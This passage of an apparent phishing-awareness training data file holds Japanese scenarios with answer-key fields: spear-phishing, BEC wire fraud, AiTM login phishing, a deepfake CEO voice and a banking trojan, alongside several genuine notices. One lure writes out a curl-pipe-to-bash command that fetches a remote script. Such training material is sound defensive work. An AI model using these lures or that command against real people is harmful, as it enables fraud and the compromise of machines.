      defenseRule: '入力リンクのない正規銀行通知は、郵送書類または公式ブックマークからログインして手続きを行う。'
    }
  },
  {
    id: 'hard_11_recruiter_spear_phish',
    difficulty: 'hard',
    medium: 'email',
    title: '国際エグゼクティブヘッドハンターからのスカウトメール',
    senderDisplay: 'Elena Rostova (Senior Partner, Horizon Global Executive Search)',
    senderAddress: 'elena.rostova@horizon-executive-scout.co.uk',
    recipientDisplay: 'user@aoba-next.jp',
    subject: 'Confidential: Chief Technology Officer (CTO) Opportunity for Leading AI Venture',
    timestamp: '本日 19:40',
    content: `Dear Candidate,

I hope this message finds you well.
I have been closely tracking your impressive technical achievements and leadership at Aoba Next.

Our client, a tier-1 funded autonomous AI robotics venture based in Tokyo and Singapore, has retained us to identify exceptional candidates for their Chief Technology Officer (CTO) position ($240,000 - $300,000 USD base + equity).

Due to strict non-disclosure obligations, the detailed company profile and compensation package have been compiled in an encrypted executive portfolio document:
https://horizon-executive-share.com/d/Executive_Job_Brief_2026.docx?auth=UK91

Please review the brief and let me know if you would be open for an introductory confidential video call next week.

Warm regards,
Elena Rostova
Managing Director | Horizon Global Executive Search London & Tokyo`,
    isSpoofed: true,
    attackType: 'キャリア・好条件誘導型スピアフィッシング（悪意あるOfficeマクロ）',
    urlInfo: {
      displayText: 'https://horizon-executive-share.com/d/Executive_Job_Brief_2026.docx?auth=UK91',
      actualUrl: 'https://horizon-executive-share.com/d/Executive_Job_Brief_2026.docx?auth=UK91',
      isSuspicious: true
    },
    psychologicalTriggers: [
      {
        type: 'greed',
        label: '年収3000万円超の高額オファー',
        description: '「年収30万ドル」「CTOポジション」という魅力的な条件で冷静な判断力を奪う。'
      },
      {
        type: 'familiarity',
        label: 'あなたの経歴・成果への具体的な称賛',
        description: 'LinkedIn等で調べた実在の役職や社名を引用し、本物のスカウトだと確信させる。'
      }
    ],
    clues: [
      {
        id: 'clue_h11_doc_macro',
        targetArea: 'url',
        label: '求人要項のダウンロードファイル（.docx）',
        isSuspicious: true,
        explanation: 'ファイルを開くと「マクロを有効化してください（コンテンツの有効化）」と促され、企業のPCにバックドアが仕込まれる北朝鮮系APT攻撃等の常套手段です。'
      },
      {
        id: 'clue_h11_domain',
        targetArea: 'sender',
        label: '新規取得されたヘッドハンティングドメイン',
        isSuspicious: true,
        explanation: '名門サーチファームを装っていますが、ドメインは先週登録されたばかりの不審なホストです。'
      }
    ],
    explanation: {
      summary: '優秀なエンジニアや幹部を狙う「好条件スカウト偽装の標的型スピアフィッシング」です。',
      whySafeOrSpoofed: '高額年収や役員待遇で関心を引き、「詳細資料」として悪意あるマクロが仕込まれたWord文書（.docx/.docm）をダウンロードさせ、企業の機密情報を盗み出します。',
      psychologicalTrap: '「自分の技術力が高く評価された」という自尊心と、「高待遇への転職チャンス」という欲求を刺激し、会社のメールアドレスに届いた危険なファイルを疑いなく開かせます。',
      checklistPoints: [
        'オフィシャルな会社の業務メール宛てに届く外部スカウトは標的型攻撃の典型例',
        'ダウンロードした文書を開いて「マクロを有効化してください」と出たら絶対に押さない',
        'ヘッドハンターの実在性やエージェント企業が実在するか外部で調査する'
      ],
      defenseRule: '業務メールに届いた破格待遇のスカウト求人文書は開かず、マクロ有効化は絶対に拒否する。'
    }
  },
  {
    id: 'hard_12_subsidiary_tax_audit_bec',
    difficulty: 'hard',
    medium: 'email',
    title: '海外子会社の緊急税務査察に伴う送金要請',
    senderDisplay: '守屋 徹（取締役最高財務責任者 CFO） <moriya.cfo@aoba-next-group.com>',
    senderAddress: 'moriya.cfo@aoba-next-group.com',
    recipientDisplay: '経理部 海外資金担当デスク <global-treasury@aoba-next.jp>',
    subject: '【極秘・特急】シンガポール現地法人 税務査察追徴金の即時納付手配（本日17時必着）',
    timestamp: '本日 15:10',
    content: `海外資金担当 各位

CFOの守屋です。
本日午後、シンガポール現地法人（Aoba Next Asia Pte. Ltd.）において、現地内国歳入庁による予告無しの緊急税務査察が執行された。
現地監査法人の助言により、追徴課税および査察保留のための供託金「SGD 350,000（日本円換算 約3,850万円）」を本日シンガポール時間17:00（日本時間18:00）までに現地指定信託口座へ電信送金しなければ、現地代表者の出国禁止措置が発動される事態となっている。

取締役会の緊急持ち回り承認は追って事後報告とする。
現地の国際信用に関わる重大事態のため、経理部長・担当役員の承認印を省略し、添付の海外送金指図書に従って直ちに大口特急海外送金を執行されたい。
なお、インサイダー取引防止のため、本件は社内完全他言無用とする。

取締役CFO 守屋 徹`,
    isSpoofed: true,
    attackType: '高度なビジネスメール詐欺（BEC：海外子会社緊急送金・CEO/CFO偽装）',
    headers: {
      'From': '守屋 徹 <moriya.cfo@aoba-next-group.com>',
      'Reply-To': 'moriya.cfo@aoba-next-group.com',
      'DKIM-Signature': 'v=1; a=rsa-sha256; d=aoba-next-group.com'
    },
    psychologicalTriggers: [
      {
        type: 'authority',
        label: '取締役最高財務責任者（CFO）の威圧',
        description: '「取締役会は事後報告」「社内完全他言無用」と最高幹部の権限を盾に稟議プロセスを強引に破壊。'
      },
      {
        type: 'urgency',
        label: '本日17時までの送金リミット',
        description: '「現地代表者の出国禁止」という破滅的リスクを突きつけ、確認の時間を奪う。'
      },
      {
        type: 'fear',
        label: '海外当局による逮捕・拘束の恐怖',
        description: '現地警察や税務当局の強制措置を連想させ、担当者を極限の恐慌状態に追い込む。'
      }
    ],
    clues: [
      {
        id: 'clue_h12_domain',
        targetArea: 'sender',
        label: '偽装された親会社ドメイン（@aoba-next-group.com）',
        isSuspicious: true,
        explanation: '自社の正規ドメイン（@aoba-next.jp）ではなく、「-group.com」を付加して本物に見せかけた新規取得ドメインです。'
      },
      {
        id: 'clue_h12_control_bypass',
        targetArea: 'body',
        label: '「社内承認フローの省略」「事後報告」の強要',
        isSuspicious: true,
        explanation: 'いかなる緊急事態であっても、企業の正規統制において経理部長や複数名の承認（デュアルコントロール）をメール1本で免除することは内部統制上あり得ません。'
      }
    ],
    explanation: {
      summary: '海外子会社の危機を捏造して大金を奪う「巨額BEC（海外子会社送金詐欺）」です。',
      whySafeOrSpoofed: '送信元は自社の「aoba-next.jp」ではなく、攻撃者が取得した「aoba-next-group.com」です。海外法人のトラブルや出国禁止を理由に、正規の送金稟議をすっ飛ばして送金させようとしています。',
      psychologicalTrap: '「同僚が海外で拘束されるかもしれない」「自分が送金を遅らせたら全社的な損害になる」という責任感と恐怖につけ込み、基本ルール（二者承認・電話照会）を自ら破らせます。',
      checklistPoints: [
        '自社の正規ドメイン（aoba-next.jp）と微妙に異なるグループ名風ドメインを見破る',
        '「通常承認フローの免除」「極秘・他言無用」と書かれた大口送金要求は100%詐欺',
        'CFO本人や現地法人の代表に、社内内線または公式Teams/Slackで直接肉声確認する'
      ],
      defenseRule: '「承認フローを飛ばせ」という役員からの海外特急送金要請は、詐欺を確信し内線で直接CFOに口頭確認する。'
    }
  },
  {
    id: 'hard_13_legit_cloud_invoice',
    difficulty: 'hard',
    medium: 'email',
    title: 'クラウド基盤「OmniCloud」の月次利用料確定通知',
    senderDisplay: 'OmniCloud Billing Team <no-reply@billing.omnicloud.jp>',
    senderAddress: 'no-reply@billing.omnicloud.jp',
    recipientDisplay: 'インフラ統括部 クラウド管理者各位 <cloud-admin@aoba-next.jp>',
    subject: '【OmniCloud】2026年10月度 サービス利用料請求書確定のご案内（契約ID: AC-98124）',
    timestamp: '本日 09:15',
    content: `いつもOmniCloudをご利用いただき誠にありがとうございます。

2026年10月度（利用期間: 2026/10/01 - 2026/10/31）のクラウドサービスご利用料金が確定いたしましたのでご案内申し上げます。

■ ご請求概要
・契約ID：AC-98124 (アオバネクスト株式会社 本社環境)
・ご請求金額：412,500円（税込）
・お支払い方法：ご登録済みの法人口座振替（2026年11月25日引落予定）

詳細なリソース別利用明細（PDF）およびインボイス対応領収データは、お客様専用の公式コンソール（https://console.omnicloud.jp/billing/reports/202610）にアクセスの上、ご確認いただけます。

※当メールにはログインパスワードや金融機関情報を直接入力させるURLは掲載しておりません。
※本メールは送信専用アドレスより自動配信されております。

OmniCloud Japan株式会社 クラウドビリングサポートデスク`,
    isSpoofed: false,
    attackType: '正規のクラウドインフラ月次請求確定通知',
    urlInfo: {
      displayText: 'https://console.omnicloud.jp/billing/reports/202610',
      actualUrl: 'https://console.omnicloud.jp/billing/reports/202610',
      isSuspicious: false
    },
    headers: {
      'From': 'OmniCloud Billing Team <no-reply@billing.omnicloud.jp>',
      'Authentication-Results': 'spf=pass dkim=pass dmarc=pass'
    },
    psychologicalTriggers: [],
    clues: [
      {
        id: 'clue_h13_domain',
        targetArea: 'sender',
        label: '正規公式ドメイン（billing.omnicloud.jp）と完全認証',
        isSuspicious: false,
        explanation: 'OmniCloudの日本法人正規ドメインであり、SPF/DKIM/DMARCがすべて正常に認証されています。'
      },
      {
        id: 'clue_h13_url',
        targetArea: 'url',
        label: '正規公式コンソールのURL（console.omnicloud.jp）',
        isSuspicious: false,
        explanation: '表示URLとリンク先URLが完全に同一であり、公式ポータル（.omnicloud.jp）の正規パスです。'
      },
      {
        id: 'clue_h13_no_threat',
        targetArea: 'body',
        label: '脅迫文やクレカ再入力要請が一切ない定例通知',
        isSuspicious: false,
        explanation: '「カードが失効した」「サービスを停止する」といった詐欺特有の脅し文句がなく、毎月定例の自動引落案内です。'
      }
    ],
    explanation: {
      summary: '極めて安全で典型的な「正規クラウド事業者の月次請求確定案内」です。',
      whySafeOrSpoofed: '送信元・リンク先ともに公式ドメイン（omnicloud.jp）であり、メール認証もpassしています。危機感を煽る文言やカード番号の再入力を迫る手口は一切ありません。',
      psychologicalTrap: 'フィッシングへの警戒心が高まると「請求書」「金額」という単語を見るだけでスパムと決めつけてしまい、経費精算や予実管理の業務を滞らせる恐れがあります。',
      checklistPoints: [
        '送信元およびリンク先が公式ドメイン（.omnicloud.jp）と一致しているか',
        'SPF/DKIM/DMARCなどの電子署名が正しくパスしているか',
        '「本日中に払わないと停止」といった不自然な脅迫やカード再入力指示がないか'
      ],
      defenseRule: '公式ドメインと一致し、脅迫や認証情報入力を求めない毎月の定例請求案内は安全な正規通知として処理する。'
    }
  },
  {
    id: 'hard_14_oss_supply_chain_pr',
    difficulty: 'hard',
    medium: 'email',
    title: '社内OSSリポジトリ宛ての重大脆弱性修正プルリクエスト',
    senderDisplay: 'DevGit Security Advisor <notifications@devgit-security.net>',
    senderAddress: 'notifications@devgit-security.net',
    recipientDisplay: 'コア開発チーム <dev-core@aoba-next.jp>',
    subject: '[AobaNext/core-auth] CRITICAL: CVE-2026-9102 detected - Automated Hotfix PR #142',
    timestamp: '本日 13:40',
    content: `[DevGit Automated Security Advisory]

リポジトリ：AobaNext/core-auth
重大度：CRITICAL (CVSS v3 9.8)
対象脆弱性：CVE-2026-9102 (Remote Code Execution in Session Deserializer)

貴社リポジトリ内の依存パッケージにおいて、リモートから認証をバイパスして任意コード実行が可能な重大なゼロデイ脆弱性が確認されました。
すでにPoC悪用コードが公開されているため、直ちに下記コマンドをCI環境またはローカル開発環境で管理者権限にて実行し、緊急パッチを適用してください：

$ curl -sSfL https://devgit-security.net/install-patch.sh | bash

※適用後に自動生成される署名トークンを本PR（#142）にコミットすることでセキュリティ警告が解除されます。

DevGit Automated Vulnerability Response System`,
    isSpoofed: true,
    attackType: 'サプライチェーン攻撃・開発環境パイプライン侵害（curlパイプ実行）',
    urlInfo: {
      displayText: 'https://devgit-security.net/install-patch.sh',
      actualUrl: 'https://devgit-security.net/install-patch.sh',
      isSuspicious: true
    },
    psychologicalTriggers: [
      {
        type: 'urgency',
        label: 'CVSS 9.8の緊急脆弱性アラート',
        description: '「任意コード実行」「PoCが公開中」という技術的危機感でエンジニアの即時対応本能を刺激。'
      },
      {
        type: 'authority',
        label: 'GitHub風の公式自動セキュリティアドバイザー偽装',
        description: 'Dependabot等の公式セキュリティ通知に酷似したフォーマットで正規の自動修正に見せかける。'
      }
    ],
    clues: [
      {
        id: 'clue_h14_curl_bash',
        targetArea: 'body',
        label: '「curl | bash」による未検証シェルスクリプトの即時実行',
        isSuspicious: true,
        explanation: '外部URLからダウンロードしたシェルスクリプトをパイプ（| bash）で直接管理者実行させるのは、開発環境の秘密鍵（SSH鍵やAWSクレデンシャル）を根こそぎ盗み出す極めて危険な攻撃パターンです。'
      },
      {
        id: 'clue_h14_domain',
        targetArea: 'sender',
        label: '不審な外部ドメイン（devgit-security.net）',
        isSuspicious: true,
        explanation: '公式の開発プラットフォームではなく、攻撃者が用意した偽装ドメインです。'
      }
    ],
    explanation: {
      summary: '開発者を標的にした「サプライチェーン型サイバー攻撃（curlパイプ罠）」です。',
      whySafeOrSpoofed: '公式セキュリティ通知に見せかけて「curl ... | bash」を実行させ、開発者のPCや社内CIサーバーにバックドア（情報窃取型マルウェア）を植え付けようとしています。',
      psychologicalTrap: 'エンジニアは「CVSS 9.8の重大脆弱性」と言われると「一刻も早く修正しなければ」という職業的義務感から、スクリプトの中身を精査せずにコピペ実行してしまいがちです。',
      checklistPoints: [
        'メールやPRに書かれた `curl ... | bash` は絶対にそのままターミナルに貼り付けない',
        '公式プラットフォーム（GitHub/GitLab等）のセキュリティ通知は、プラットフォーム上の公式UIで直接確認する',
        'パッチ適用はパッケージマネージャ（npm/pip等）の公式レジストリ経由で行う'
      ],
      defenseRule: '「curl | bash」を要求するセキュリティ修正案内は絶対に実行せず、スクリプト内容と送信元を精査する。'
    }
  },
  {
    id: 'hard_15_legit_audit_confirmation',
    difficulty: 'hard',
    medium: 'email',
    title: '大和東邦監査法人からの年度決算に係る残高確認書送付案内',
    senderDisplay: '大和東邦監査法人 アオバネクスト監査チーム <audit-confirm@yamato-toho-audit.or.jp>',
    senderAddress: 'audit-confirm@yamato-toho-audit.or.jp',
    recipientDisplay: '経理財務部 決算統括担当者様 <keiri@aoba-next.jp>',
    subject: '【監査手続】2026年度 中間決算に係る銀行預金残高確認書（書面原本）ご郵送の件',
    timestamp: '2026年10月28日 11:30',
    content: `アオバネクスト株式会社
経理財務部 決算統括ご担当者様

平素より大変お世話になっております。
大和東邦監査法人 アオバネクスト監査エンゲージメントチームの公認会計士 水上です。

さて、2026年度中間決算の法定会計監査手続の一環といたしまして、貴社主要取引金融機関宛ての預金残高確認手続を実施いたします。

本日、当監査法人より貴社経理部宛てに、各金融機関宛て依頼状および確認書様式一式を「簡易書留（追跡番号：5819-2018-9128）」にて発送いたしました。
内容をご確認いただき、貴社お届出印をご捺印の上、同封の当監査法人宛て返信用封筒にてご返送いただけますようお願い申し上げます。

※情報セキュリティ確保のため、当法人よりメールやWebフォーム等で暗証番号やネットバンキングの認証情報を入力いただくようお願いすることは一切ございません。

大和東邦監査法人 第3監査事業部
公認会計士 水上 雅也`,
    isSpoofed: false,
    attackType: '正規の外部会計監査手続案内',
    headers: {
      'From': '大和東邦監査法人 <audit-confirm@yamato-toho-audit.or.jp>',
      'Authentication-Results': 'spf=pass dkim=pass dmarc=pass'
    },
    psychologicalTriggers: [],
    clues: [
      {
        id: 'clue_h15_physical_mail',
        targetArea: 'body',
        label: '追跡番号付きの「郵送・書面原本」による監査手続',
        isSuspicious: false,
        explanation: '電子的リンクでのパスワード詐取ではなく、簡易書留の物理書類と公認会計士の印鑑照合による厳正な法定監査手順です。'
      },
      {
        id: 'clue_h15_no_credential',
        targetArea: 'body',
        label: '「メールやフォームでの認証情報入力は一切求めない」方針の明記',
        isSuspicious: false,
        explanation: '詐欺メールと異なり、入力用URLが存在せず、秘密情報の電子提出を要求していません。'
      },
      {
        id: 'clue_h15_domain',
        targetArea: 'sender',
        label: '監査法人の正規ドメイン（.or.jp）',
        isSuspicious: false,
        explanation: '法人格が確認された日本国内の公式ドメイン（.or.jp）からSPF/DKIM正常で届いています。'
      }
    ],
    explanation: {
      summary: '極めて厳格で安全な「外部監査法人からの正規法定監査手続案内」です。',
      whySafeOrSpoofed: 'メール本文に不審なURLやファイル添付が一切なく、書留郵便を用いた実務上の正当な監査確認手続です。公認会計士の担当者名も明記されています。',
      psychologicalTrap: '「監査」という言葉への警戒から「怪しいメールだ」と無視すると、法定決算スケジュールに重大な遅延が生じ、上場企業の開示責任に抵触する恐れがあります。',
      checklistPoints: [
        '入力フォームやログイン用リンクが一切含まれていないか',
        '簡易書留による郵送手続など、物理的・公的な手段に基づいているか',
        '担当の公認会計士名や監査法人ドメインが契約書記載のものと一致しているか'
      ],
      defenseRule: '入力リンクのない書面監査通知は、契約済みの正規監査法人であることを確認の上、通常業務として進める。'
    }
  },
  {
    id: 'hard_16_evilginx_reverse_proxy',
    difficulty: 'hard',
    medium: 'email',
    title: 'クラウドグループウェアの「臨時セキュリティセッション延長」案内',
    senderDisplay: 'CloudSync 認証基盤センター <security-auth@cloudsync-session-auth.com>',
    senderAddress: 'security-auth@cloudsync-session-auth.com',
    recipientDisplay: '全社アカウント各位 <user@aoba-next.jp>',
    subject: '【重要】全社セッション有効期限の更新とFIDO2二要素再検証のお願い',
    timestamp: '本日 11:20',
    content: `全社アカウント ご利用各位

社内統合クラウドプラットフォーム「CloudSync」セキュリティ推進室よりお知らせいたします。

本日実施されたシングルサインオン（SSO）基盤の耐タンパー性強化メンテナンスに伴い、全従業員の認証セッションが無効化されました。
業務中断を防ぐため、本日14:00までに下記専用ポータルより再認証を完了し、認証アプリのワンタイムパスワードを入力してください。

▼ CloudSync SSO再認証ポータル
https://login.cloudsync.jp.auth-verify-portal.com/oauth2/authorize?client_id=aoba_corp

※期限までに再認証が行われない場合、社内共有フォルダおよびメールボックスへのアクセスが即時一時凍結されます。

CloudSync クラウド認証運用管理部`,
    isSpoofed: true,
    attackType: 'リバースプロキシ型フィッシング（AiTM：Adversary-in-the-Middle）',
    urlInfo: {
      displayText: 'https://login.cloudsync.jp.auth-verify-portal.com/oauth2/authorize?client_id=aoba_corp',
      actualUrl: 'https://login.cloudsync.jp.auth-verify-portal.com/oauth2/authorize?client_id=aoba_corp',
      isSuspicious: true
    },
    psychologicalTriggers: [
      {
        type: 'confusion',
        label: 'サブドメイン偽装の視覚的トリック',
        description: '「login.cloudsync.jp」をサブドメイン部分に配置し、本物のドメインだと錯覚させる。'
      },
      {
        type: 'urgency',
        label: '14時までの凍結期限',
        description: '「メールや共有フォルダが凍結される」と脅迫してドメインの末尾を確認させない。'
      }
    ],
    clues: [
      {
        id: 'clue_h16_subdomain',
        targetArea: 'url',
        label: '巧妙なサブドメイン偽装（auth-verify-portal.com）',
        isSuspicious: true,
        explanation: 'URLの先頭に「login.cloudsync.jp」と入っていますが、実際の親ドメインは「auth-verify-portal.com」です。ブラウザは一番右側の親ドメインに接続するため、これは攻撃者のサーバーです。'
      },
      {
        id: 'clue_h16_aitm',
        targetArea: 'body',
        label: 'MFAワンタイムコードまで中継・詐取する手口',
        isSuspicious: true,
        explanation: 'リバースプロキシ（Evilginx等）を用いてユーザーが入力したパスワードとワンタイムコードを本物のサーバーへリアルタイム転送し、発行されたセッションCookieを盗み取るAiTM攻撃です。'
      }
    ],
    explanation: {
      summary: '二要素認証をリアルタイムで突破する「リバースプロキシ型（AiTM）フィッシング」です。',
      whySafeOrSpoofed: '「login.cloudsync.jp」に見せかけていますが、実際のドメインは「auth-verify-portal.com」です。本物と寸分違わぬログイン画面が表示され、ワンタイムコードを入力するとセッショントークンが盗まれてMFAを突破されます。',
      psychologicalTrap: '先頭の文字列だけを見て「いつものURLだ」と早合点してしまう人間の認知バイアスと、「メールが使えなくなる」という焦燥感を巧みに利用しています。',
      checklistPoints: [
        'URLの「/」の手前にある親ドメイン（一番右側のドメイン名）を必ず確認する',
        'メール内のリンクを踏まず、普段使っているブラウザのブックマークからアクセスする',
        'FIDO2/WebAuthn（パスキー等）などのフィッシング耐性のある認証方式の導入を検討する'
      ],
      defenseRule: 'URLは先頭の文字列ではなく、「/」の直前にある親ドメインを右から左へ読んで確認する。'
    }
  },
  {
    id: 'hard_17_ai_voice_clone_ceo',
    difficulty: 'hard',
    medium: 'chat',
    title: '代表取締役からの「緊急電話会議前音声メッセージ」と機密着金確認',
    senderDisplay: '浦山社長（海外エグゼクティブ直通） <ceo_hotline@exec-satellite.net>',
    senderAddress: 'ceo_hotline@exec-satellite.net',
    recipientDisplay: '経営企画・資金決済担当DM',
    timestamp: '本日 18:45',
    content: `〇〇君、至急対応してほしい。

【音声メッセージが添付されています】
▶ [再生: 0:18] 浦山社長の声：「〇〇君、浦山だ。今ロンドンの会食で相手先プライベートエクイティの代表と詰めの交渉をしている。先方条件で、本日中にデポジット保証金4,500万円の着金スウィフト電信が必要になった。添付の極秘口座へ直ちに資金移動してくれ。詳細は戻ってから話す」

添付ファイル：Confidential_Remittance_Instruction_UK.pdf (180KB)
添付音声：CEO_Voice_Message_London_Urgent.m4a (280KB)

誰にも口外せず、至急手続きを完了させて受領証をチャットに送ってくれ。`,
    isSpoofed: true,
    attackType: 'AIディープフェイク音声悪用ビジネスメール詐欺（CEO Vishing / BEC）',
    attachmentInfo: {
      fileName: 'CEO_Voice_Message_London_Urgent.m4a',
      fileSize: '280KB',
      isSuspicious: true,
      note: '生成AIで本人の過去の講演・決算説明会動画の音声から学習・合成されたクローン音声'
    },
    psychologicalTriggers: [
      {
        type: 'authority',
        label: '「本人の肉声」という絶対的説得力',
        description: 'テキストだけでなく「社長自身の声」を聴かせることで、人間の「声なら本人に違いない」という盲信を突く。'
      },
      {
        type: 'urgency',
        label: 'ロンドンでの会食交渉中の即時送金',
        description: '「今この瞬間に振り込まないと破談になる」という極限の緊張感で社内規定チェックを麻痺させる。'
      }
    ],
    clues: [
      {
        id: 'clue_h17_voice_clone',
        targetArea: 'attachment',
        label: 'AI音声合成（ディープフェイクボイス）の悪用',
        isSuspicious: true,
        explanation: '現代の生成AIは数秒のYouTube講演動画から本物そっくりのイントネーションや息遣いまで再現できます。「声が本人だから本物」という常識は通用しません。'
      },
      {
        id: 'clue_h17_channel',
        targetArea: 'sender',
        label: '不審な外部アドレス（@exec-satellite.net）からのDM',
        isSuspicious: true,
        explanation: '社内公式のTeams/Slackアカウントや正規メールアドレスではなく、外部の不審なアドレスから送信されています。'
      }
    ],
    explanation: {
      summary: '最新の生成AIを悪用した「ディープフェイク音声クローン型BEC」です。',
      whySafeOrSpoofed: 'YouTube等で公開されている決算説明会などの動画から社長の声をAIクローンし、あたかも本人が海外から切迫して電話しているかのような音声ファイルを添付して送金を強要しています。',
      psychologicalTrap: '人間は「声」を聞くと疑うことをやめてしまう心理的脆弱性を持っています。さらに「極秘」「他言無用」で縛ることで、他の役員や総務への確認を封じます。',
      checklistPoints: [
        '「声が本人だから安全」は現在完全に誤り。音声や動画もAI生成可能と知る',
        '急な大口振込要求は、事前に決めた「合言葉（コードワード）」や別ルートの内線・公認携帯番号で本人の肉声確認を行う',
        'いかなる緊急時であっても、規定の複数承認プロセスを省略しない'
      ],
      defenseRule: 'AI音声クローンのリスクを認識し、送金指示は必ず既知の社内内線や公式携帯で直接折り返して確認する。'
    }
  },
  {
    id: 'hard_18_bank_cert_updater_trojan',
    difficulty: 'hard',
    medium: 'email',
    title: 'サクラ中央銀行 法人バンキング専用電子証明書更新プログラム',
    senderDisplay: 'サクラ中央銀行 e-ビジネス推進部 <ebiz-support@sakura-central-ebank.net>',
    senderAddress: 'ebiz-support@sakura-central-ebank.net',
    recipientDisplay: '法人インターネットバンキング管理者様 <keiri-ebank@aoba-next.jp>',
    subject: '【至急】法人インターネットバンキング クライアント電子証明書更新プログラム（v4.2）適用のお願い',
    timestamp: '本日 10:45',
    content: `アオバネクスト株式会社 法人バンキングご担当者様

平素よりサクラ中央銀行法人向けオンラインバンキングをご利用いただき厚く御礼申し上げます。

2026年11月1日より施行される金融庁サイバーセキュリティガイドライン改定に伴い、法人インターネットバンキングで利用するクライアント証明書の暗号スイート更新（TLS 1.3対応）が義務付けられました。

つきましては、貴社の送金操作端末において、添付の「最新電子証明書更新ツール（SakuraBank_CertUpdater_v4.exe）」を実行し、画面の指示に従って更新を完了させてください。

添付ファイル：SakuraBank_CertUpdater_v4.exe (1.2MB)

※今週金曜日までに更新が完了しない場合、次週月曜日の総合振込および給与振込データ伝送が受付不能となりますので、速やかな適用をお願いいたします。

サクラ中央銀行 デジタルイノベーション統括部`,
    isSpoofed: true,
    attackType: 'バンキング型トロイの木馬・マルウェア配布（電子証明書偽装）',
    attachmentInfo: {
      fileName: 'SakuraBank_CertUpdater_v4.exe',
      fileSize: '1.2MB',
      isSuspicious: true,
      note: '実行すると端末のブラウザに常駐し、バンキング送金時に送金先と金額をステルス改ざんするバンキング型トロイの木馬'
    },
    psychologicalTriggers: [
      {
        type: 'fear',
        label: '給与振込・総合振込が停止する恐怖',
        description: '「給料が払えなくなる」「取引先への振込が止まる」という致命的リスクで担当者を脅す。'
      },
      {
        type: 'authority',
        label: 'メインバンクおよび金融庁ガイドラインの威光',
        description: '銀行名と公的ガイドラインを引用し、疑問を持たせずに「.exe」を実行させる。'
      }
    ],
    clues: [
      {
        id: 'clue_h18_exe',
        targetArea: 'attachment',
        label: 'メール添付の実行ファイル（.exe）',
        isSuspicious: true,
        explanation: '本物の銀行が、メール添付で実行可能プログラム（.exe）を送りつけて「実行しろ」と指示することは100%あり得ません。'
      },
      {
        id: 'clue_h18_domain',
        targetArea: 'sender',
        label: '銀行の偽装ドメイン（@sakura-central-ebank.net）',
        isSuspicious: true,
        explanation: '日本の銀行の公式ドメインは「.co.jp」等であり、新規に取得された「.net」ドメインは詐欺ホストです。'
      }
    ],
    explanation: {
      summary: '銀行を騙って送金乗っ取りウイルスを実行させる「バンキング型マルウェア攻撃」です。',
      whySafeOrSpoofed: '「電子証明書の更新」と偽り、メール添付の実行ファイル（.exe）を実行させようとしています。実行するとバックグラウンドでブラウザが乗っ取られ、後日送金操作を行った際に送金先が攻撃者の口座に自動置換されます。',
      psychologicalTrap: '「給与振込が止まる」という経理担当者にとって最大の悪夢を突きつけ、パニック状態のまま添付ファイルを開かせようとします。',
      checklistPoints: [
        'メール添付の実行ファイル（.exe / .scr / .bat / .vbs）は絶対に実行しない',
        '正規の銀行電子証明書更新は、公式Webブラウザログイン後の管理メニュー内で完結する',
        '銀行から不審な実行プログラムが届いたら、取引店の担当窓口に直ちに電話で通報する'
      ],
      defenseRule: '金融機関を名乗るメールに添付された実行ファイル（.exe）は絶対に開かず、取引店に即通報する。'
    }
  },
  {
    id: 'hard_19_legit_patent_filing_fee',
    difficulty: 'hard',
    medium: 'email',
    title: '提携特許業務法人からの特許庁出願審査請求料 納付手続完了報告',
    senderDisplay: '桜坂国際特許商標事務所 弁理士 水野 涼子 <r-mizuno@sakurazaka-patent.jp>',
    senderAddress: 'r-mizuno@sakurazaka-patent.jp',
    recipientDisplay: '知的財産部 特許出願担当者様 <chizai@aoba-next.jp>',
    subject: '【特許出願】出願番号2026-081942 審査請求手続完了のご報告および受領書送付',
    timestamp: '2026年10月29日 15:30',
    content: `アオバネクスト株式会社
知的財産部 特許出願ご担当者様

平素より格別のご愛顧を賜り厚く御礼申し上げます。
桜坂国際特許商標事務所の弁理士 水野です。

先般10月15日付でご指示をいただいておりました貴社特許出願につきまして、本日特許庁への「出願審査請求書」の提出および審査請求料の電子納付手続きが完了いたしましたのでご報告申し上げます。

■ 対象案件
・発明の名称：分散型認証制御システムおよびプログラム
・出願番号：特願2026-081942
・審査請求日：2026年10月29日

特許庁より発行された「手続受領書（電子受領書原本）」を添付PDFにてお送りいたします。
なお、本件にかかる弊所手数料につきましては、通常通り当月末締めの月次一括請求書にてご案内いたしますので、今回のお振込み等は不要でございます。

今後ともよろしくお願い申し上げます。

桜坂国際特許商標事務所
弁理士 水野 涼子
電話：03-5291-XXXX / FAX：03-5291-XXXX`,
    isSpoofed: false,
    attackType: '正規の知的財産特許手続完了報告',
    attachmentInfo: {
      fileName: 'Patent_Office_Receipt_2026-081942.pdf',
      fileSize: '142KB',
      isSuspicious: false,
      note: '特許庁の電子出願ソフトより発行された正規の手続受領書PDF'
    },
    headers: {
      'From': '桜坂国際特許商標事務所 <r-mizuno@sakurazaka-patent.jp>',
      'Authentication-Results': 'spf=pass dkim=pass dmarc=pass'
    },
    psychologicalTriggers: [],
    clues: [
      {
        id: 'clue_h19_prior_context',
        targetArea: 'body',
        label: '自社から事前に依頼した案件番号（特願2026-081942）との合致',
        isSuspicious: false,
        explanation: '突如届いた見知らぬ連絡ではなく、社内から指示を出した実在の特許出願案件の進捗報告です。'
      },
      {
        id: 'clue_h19_no_payment',
        targetArea: 'body',
        label: '「今回のお振込み等は不要」「月末一括請求」の明記',
        isSuspicious: false,
        explanation: '詐欺メール特有の「今すぐ振り込め」という要求がなく、既存の月次掛け売り契約通りの事務処理です。'
      },
      {
        id: 'clue_h19_pdf',
        targetArea: 'attachment',
        label: '正規の公的受領書PDF添付',
        isSuspicious: false,
        explanation: '実行ファイルやマクロ付き文書ではなく、特許庁正規受領書のクリーンなPDFです。'
      }
    ],
    explanation: {
      summary: '正当な契約に基づく「提携特許事務所からの正規手続完了報告」です。',
      whySafeOrSpoofed: '過去に自社が依頼した案件番号と完全に合致しており、急ぎの振込やリンク先ログインを求める要素は一切ありません。電子署名もすべてパスしています。',
      psychologicalTrap: 'セキュリティ対策を意識しすぎるあまり、業務上必要な弁理士や法律顧問からの正当な受領書・報告書を破棄してしまうリスクを検証するケースです。',
      checklistPoints: [
        '記載されている案件番号や発明の名称が社内台帳と合致しているか',
        '不審な送金口座への即時振込やURLクリックを要求していないか',
        '提携弁理士のメールアドレスおよびドメインが正規のものか'
      ],
      defenseRule: '事前に依頼済みの案件と合致し、即時送金等の要求がない提携専門家からの報告は正規業務として受領する。'
    }
  },
  {
    id: 'hard_20_quishing_wifi_profile',
    difficulty: 'hard',
    medium: 'browser_alert',
    title: '社内会議室エリアの新設Wi-Fi接続案内',
